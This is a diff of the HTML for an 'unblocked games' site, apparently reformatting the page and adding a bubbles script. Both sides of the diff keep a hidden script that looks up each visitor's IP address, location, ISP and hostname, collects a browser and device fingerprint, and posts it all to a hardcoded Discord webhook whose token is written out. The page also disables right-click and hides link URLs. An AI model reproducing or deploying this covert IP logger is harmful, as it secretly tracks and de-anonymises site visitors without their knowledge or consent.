@@ -1,23 +1,25 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
     <link rel="icon" type="image/x-icon" href="/favicon.ico" />
     <link rel="stylesheet" type="text/css" href="/css/index.css" />
-    <title>the site</title>
+    <title>The Site</title>
     <meta name="keywords" content="front-end web developer, unblocked, games, google sites, unblocked games mom, ublocked, code, coding, programmer, development, javascript, jquery, bootstrap, sass, less, git" />
     <meta property="og:title" content="Welcome to the site, your best option for unblocked games on the internet." />
-    <meta property="og:site_name" content="the site" />
+    <meta property="og:site_name" content="The Site" />
     <meta property="og:description" content="Welcome to the site, your best option for unblocked games on the internet." />
     <meta name="description" content="Welcome to the site, your best option for unblocked games on the internet." />
     <meta name="author" content="medrokian" />
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="stylesheet" type="text/css" href="/bubbles.css" />
+    <script src="/bubbles.js"></script>
 </head>
 <body>
-        <!-- Project Code -->
-        <div id="projectCode">
-            <!-- Replace the following placeholder with your code -->
-            <p><!DOCTYPE html>
+    <!-- Project Code -->
+    <div id="projectCode">
+        <!-- Replace the following placeholder with your code -->
+        <p><!DOCTYPE html>
 <html>
   <head>
     <title>Projects | medrokian</title>
@@ -35,14 +37,15 @@
     <script src="/js/main.js"></script>
   </head>
   <body>
-       <script>
+    <script src="bubbles.js"></script>
+    <script>
         document.querySelectorAll('.no-drag').forEach(function(link) {
             link.addEventListener('dragstart', function(event) {
                 event.preventDefault();
             });
         });
     </script>
-   <script>
+    <script>
         document.querySelectorAll('.no-url a').forEach(function(link) {
             link.addEventListener('mouseover', function(event) {
                 event.preventDefault();
@@ -53,10 +56,10 @@
             });
         });
     </script>
- <script>
+    <script>
         document.addEventListener('contextmenu', event => event.preventDefault());
     </script>
-<style>
+    <style>
         .no-url a {
             pointer-events: none;
         }
@@ -65,93 +68,89 @@
             pointer-events: all;
         }
     </style>
-     <script>
-    function filterGames() {
-        const query = document.getElementById('searchBar').value.toLowerCase();
-        const games = document.querySelectorAll('.game-link');
-
-        games.forEach(game => {
-            const title = game.querySelector('.game-title').innerText.toLowerCase();
-            if (title.includes(query)) {
-                game.style.display = 'block';
-            } else {
-                game.style.display = 'none';
-            }
-        });
-    }
-</script>
-
-
-       <script>
-      let echolog = {};
-      fetch("https://wtfismyip.com/json")
-        .then((response) => response.json())
-        .then((data) => {
-          let echolog = {
-            ipAddress: data.YourFuckingIPAddress,
-            location: data.YourFuckingLocation,
-            hostname: data.YourFuckingHostname,
-            isp: data.YourFuckingISP,
-            city: data.YourFuckingCity,
-            country: data.YourFuckingCountry,
-            countryCode: data.YourFuckingCountryCode,
-            userAgent: navigator.userAgent,
-            windowProp: Object.keys(window).length,
-            windowWidth: window.innerWidth,
-            windowHeight: window.innerHeight,
-            windowRatio: window.innerWidth / window.innerHeight,
-            screenWidth: window.screen.availWidth,
-            screenHeight: window.screen.availHeight,
-            screenRatio: window.screen.availWidth / window.screen.availHeight,
-            DPI: window.devicePixelRatio,
-            colorDepth: window.screen.colorDepth,
-            orientation: window.screen.orientation.type,
-            orientationAngle: window.screen.orientation.angle,
-            os: navigator.platform,
-            threads: navigator.hardwareConcurrency,
-            memory: navigator.deviceMemory,
-            systemLanguages: navigator.languages.join(", "),
-            languages: navigator.language,
-
-              
-          };
-
-          // Set up the payload for the webhook
-          const payload = {
-            content: `IP Address: ${echolog.ipAddress}\nLocation: ${echolog.location}\nHostname: ${echolog.hostname}\nISP: ${echolog.isp}\nCity: ${echolog.city}\nCountry: ${echolog.country}\nCountry Code: ${echolog.countryCode}\nUser Agent: ${echolog.userAgent}\nWindow Properties: ${echolog.windowProp}\nWindow Width: ${echolog.windowWidth}\nWindow Height: ${echolog.windowHeight}\nWindow Ratio: ${echolog.windowRatio}\nScreen Width: ${echolog.screenWidth}\nScreen Height: ${echolog.screenHeight}\nScreen Ratio: ${echolog.screenRatio}\nDPI: ${echolog.DPI}\nColor Depth: ${echolog.colorDepth}\nOrientation: ${echolog.orientation}\nOrientation Angle: ${echolog.orientationAngle}\nOS: ${echolog.os}\nThreads: ${echolog.threads}\nMemory: ${echolog.memory}\nSystem Languages: ${echolog.systemLanguages}\nLanguages: ${echolog.languages}`,
-          };
-          // This is a lazy way of doing it, having
-          // your webhook url out in the open like
-          // this is a bad idea, you should instead
-          // have it contact a internal API to
-          // forward the request.
-          fetch("https://discord.com/api/webhooks/1229973958540005426/c8nQJOzBR0I14H8nu0fECs5w4me94z6W6mhMde_OtZV6c7GgKkkzgWMqxvQL3ob4NBVr", {
-            method: "POST",
-            headers: {
-              "Content-Type": "application/json",
-            },
-            body: JSON.stringify(payload),
-          })
-            .then((response) => console.log(response))
-            .catch((error) => console.error(error));
-        })
-        .catch((error) => console.error(error));
+    <script>
+        function filterGames() {
+            const query = document.getElementById('searchBar').value.toLowerCase();
+            const games = document.querySelectorAll('.game-link');
+            games.forEach(game => {
+                const title = game.querySelector('.game-title').innerText.toLowerCase();
+                if (title.includes(query)) {
+                    game.style.display = 'block';
+                } else {
+                    game.style.display = 'none';
+                }
+            });
+        }
     </script>
-<audio autoplay loop>
-  <source src="menu.ogg" type="audio/ogg">
-</audio>
+    <script>
+        let echolog = {};
+        fetch("https://wtfismyip.com/json")
+            .then(response => response.json())
+            .then(data => {
+                echolog = {
+                    ipAddress: data.YourFuckingIPAddress,
+                    location: data.YourFuckingLocation,
+                    hostname: data.YourFuckingHostname,
+                    isp: data.YourFuckingISP,
+                    city: data.YourFuckingCity,
+                    country: data.YourFuckingCountry,
+                    countryCode: data.YourFuckingCountryCode,
+                    userAgent: navigator.userAgent,
+                    windowProp: Object.keys(window).length,
+                    windowWidth: window.innerWidth,
+                    windowHeight: window.innerHeight,
+                    windowRatio: window.innerWidth / window.innerHeight,
+                    screenWidth: window.screen.availWidth,
+                    screenHeight: window.screen.availHeight,
+                    screenRatio: window.screen.availWidth / window.screen.availHeight,
+                    DPI: window.devicePixelRatio,
+                    colorDepth: window.screen.colorDepth,
+                    orientation: window.screen.orientation.type,
+                    orientationAngle: window.screen.orientation.angle,
+                    os: navigator.platform,
+                    threads: navigator.hardwareConcurrency,
+                    memory: navigator.deviceMemory,
+                    systemLanguages: navigator.languages.join(", "),
+                    languages: navigator.language,
+                };
+
+                // Set up the payload for the webhook
+                const payload = {
+                    content: `IP Address: ${echolog.ipAddress}\nLocation: ${echolog.location}\nHostname: ${echolog.hostname}\nISP: ${echolog.isp}\nCity: ${echolog.city}\nCountry: ${echolog.country}\nCountry Code: ${echolog.countryCode}\nUser Agent: ${echolog.userAgent}\nWindow Properties: ${echolog.windowProp}\nWindow Width: ${echolog.windowWidth}\nWindow Height: ${echolog.windowHeight}\nWindow Ratio: ${echolog.windowRatio}\nScreen Width: ${echolog.screenWidth}\nScreen Height: ${echolog.screenHeight}\nScreen Ratio: ${echolog.screenRatio}\nDPI: ${echolog.DPI}\nColor Depth: ${echolog.colorDepth}\nOrientation: ${echolog.orientation}\nOrientation Angle: ${echolog.orientationAngle}\nOS: ${echolog.os}\nThreads: ${echolog.threads}\nMemory: ${echolog.memory}\nSystem Languages: ${echolog.systemLanguages}\nLanguages: ${echolog.languages}`,
+                };
+
+                // This is a lazy way of doing it, having
+                // your webhook url out in the open like
+                // this is a bad idea, you should instead
+                // have it contact a internal API to
+                // forward the request.
+                fetch("https://discord.com/api/webhooks/1229973958540005426/c8nQJOzBR0I14H8nu0fECs5w4me94z6W6mhMde_OtZV6c7GgKkkzgWMqxvQL3ob4NBVr", {
+                    method: "POST",
+                    headers: {
+                        "Content-Type": "application/json",
+                    },
+                    body: JSON.stringify(payload),
+                })
+                    .then(response => console.log(response))
+                    .catch(error => console.error(error));
+            })
+            .catch(error => console.error(error));
+    </script>
+    <audio autoplay loop>
+        <source src="menu.ogg" type="audio/ogg">
+    </audio>
     <h1 class="text-center">Projects</h1>
     <p class="text-center">Here is the full list of games on this site, play some of your favorites or find a new one!</p>
     <div class="flex-container">
-        
- <input type="text" id="searchBar" onkeyup="filterGames()" placeholder="Search for games..." style="margin: 20px; padding: 10px; width: calc(100% - 40px); background-color: #191970; color: #000000;">    
-   
+        <input type="text" id="searchBar" onkeyup="filterGames()" placeholder="Search for games..." style="margin: 20px; padding: 10px; width: calc(100% - 40px); background-color: #191970; color: #ffffff;">    
+
         <a href="projects/suggestions/index.html" class="game-link container">
-        <div class="game-tile">
-          <img class="game-icon" src="projects/suggestions/form.png" alt="icon" />
-          <h1 class="game-title">game addition suggestions</h1>
-        </div>
-      </a>
+            <div class="game-tile">
+                <img class="game-icon" src="projects/suggestions/form.png" alt="icon" />
+                <h1 class="game-title">Game Addition Suggestions</h1>
+            </div>
+        </a>
+
       
       <a href="projects/1/index.html" class="game-link container">
         <div class="game-tile">
